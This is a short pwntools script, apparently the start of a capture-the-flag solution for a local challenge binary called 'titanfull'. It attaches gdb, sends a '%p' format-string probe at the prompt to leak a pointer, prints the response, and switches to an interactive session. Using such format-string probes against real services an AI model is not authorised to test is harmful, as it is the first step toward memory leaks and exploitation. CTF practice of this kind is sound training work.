from pwn import *

rem = process("./Pwnable/Titanfull/problem/titanfull")
gdb.attach(rem)

rem.sendlineafter(b"> ", b"%p")
print(rem.recvline())

rem.interactive()